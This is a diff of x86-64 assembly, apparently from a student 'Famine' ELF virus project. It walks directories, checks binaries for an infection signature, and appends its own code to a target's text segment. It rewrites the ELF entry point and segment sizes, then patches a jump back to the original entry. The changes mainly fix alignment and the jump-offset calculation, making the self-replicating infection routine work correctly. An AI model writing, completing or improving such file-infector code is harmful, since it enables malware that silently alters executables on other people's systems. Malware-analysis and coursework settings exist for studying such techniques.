@@ -15,11 +15,11 @@ _start:
     call _readDir
 
     ; debug
-    writeBack
-    mov rsi, tiret
-    writeWork
-    writeBack
-    writeBack
+    ; writeBack
+    ; mov rsi, tiret
+    ; writeWork
+    ; writeBack
+    ; writeBack
 
     mov rdi, dir2
     mov rsi, dir2Len
@@ -41,7 +41,8 @@ _readDir:
     xor rdx, rdx
     syscall
     cmp rax, 0
-    jl _exit
+	jl _returnReadir
+    ; jl _exit
     lea rdi, FAM(famine.fd)                         ; enregistre le fd dans la struct
     mov [rdi], rax
 
@@ -80,9 +81,9 @@ _readDir:
             mov rdi, FAM(famine.pwdPtr)
             call _strcpy
 
-            ;debug
-            writeWork
-            writeBack
+            ; ;debug
+            ; writeWork
+            ; writeBack
             
             ;met ta fonction ici
 			_bf_chk_file:
@@ -139,7 +140,7 @@ _check_file:
 
 	_find_text_seg:
 	;*rax	-> map
-	;*r14	-> header table
+	; r14	-> header table
 		mov r14, rax								; r14 -> elf start addr
 		add r14, [r14 + elf64_ehdr.e_phoff]			; r14 -> start of segment headers's table
 		movzx r15, word [rax + elf64_ehdr.e_phnum]	; r15 = number of segments (see _segment_loop)
@@ -176,6 +177,7 @@ _check_file:
 	; r15	-> potential signature
 	; === check if infected (read signature) ===
 		mov r15, r14								; r15 -> curr_phdr
+		; use rbx
 		add r15, [r14 + elf64_phdr.p_filesz]		; r15 -> end curr_seg
 		add r15, CODE_LEN
 		sub r15, _end - signature					; r15 -> start of potential signature
@@ -191,6 +193,7 @@ _infection:
 ; r13	== original entrypoint offset
 ;*r14	-> segment header
 ; r15	-> segment end
+	; use rbx
 	mov r15, rax							; r15 -> start of map
 	add r15, [r14 + elf64_phdr.p_offset]	; r15 -> start of segment
 	add r15, [r14 + elf64_phdr.p_filesz]	; r15 -> end of the segment
@@ -206,6 +209,8 @@ _infection:
 	; ehdr->e_entry = (Elf64_Addr)(cave_segment->p_vaddr + cave_segment->p_memsz);
 		mov r11, r15							; r11 -> end of curr_segment
 		sub r11, rax 							; r11 = injection offset
+		add r11, 0x10
+		and r11, -16							; align
 		mov [r12], r11							; ehdr.e_entry = injection offset
 	; === update segment hdr ===
 	_update_seg_hdr:
@@ -213,35 +218,43 @@ _infection:
 	;*r14	-> segment header
 	mov r12, r14
 	add r12, elf64_phdr.p_filesz
+	add	qword [r12], 0x10
+	and qword [r12], -16
 	add	qword [r12], qword CODE_LEN
 	add r14, elf64_phdr.p_memsz
+	add qword [r14], 0x10
+	and qword [r14], -16
 	add qword [r14], qword CODE_LEN
 	; === copy parasite ===
 	_copy_parasite:
 	;*r15	-> segment_end
 		mov rdi, r15							; rdi -> end of curr_seg(start of injection)
+		add rdi, 0x10
+		and rdi, -16							; align
 		lea rsi, [rel _start]					; rsi -> start of our code
-		xor rcx, rcx
 		mov rcx, CODE_LEN						; counter will decrement
 		cld										; copy from _start to _end (= !std)
 		rep movsb
 	; === update jmp end parasite ===
 	_update_parasite_jmp:
-	; r10	-> parasite final jmp instruction
+	;*rax	-> map
 	;*r11	== injection offset
-	; r12	== distance to jump from parasite last jmp to original entry
+	;*r12	-> ehdr.e_entry
 	;*r13	== original entry offset
-	; r14	-> parsite's _start
-	; int32_t	jmp_offset = original_entry - (0x1175 + index_jmp + 5); 
-		lea r12, [rel _final_jmp]				; r12 -> _final_jmp
-		lea r14, [rel _start]					; r14 -> parasite _start
-		sub r12, r14							; r12 == _final_jmp's offset
-		add r12, r11 							; r12 == _final_jmp's offset in final binary
-		mov r10, rax
-		add r10, r12							; 
-		add r10, 0x1							; r11 -> just after the jmp instruction
-		mov [r10], qword r13					; write the offset to jump to
-
+	; r15	-> _final_jmp
+	; jmp_offset = original_entry - (entry_offset + final_jmp_offset_in_parasite + 5); 
+		; mov r15, _final_jmp
+		; mov r14, _start
+		; sub r15, r14							; r15 == _final_jmp offset
+		mov r15, rax							; r15 -> final_jmp in map
+		add r15, r11
+		add r15, FINJMP_OFF
+		inc r15	
+		mov r10, r11
+		add r10, FINJMP_OFF
+		sub r13, r10
+		sub r13, 0x5
+		mov [r15], r13d
 
 	jmp _leave_return
 
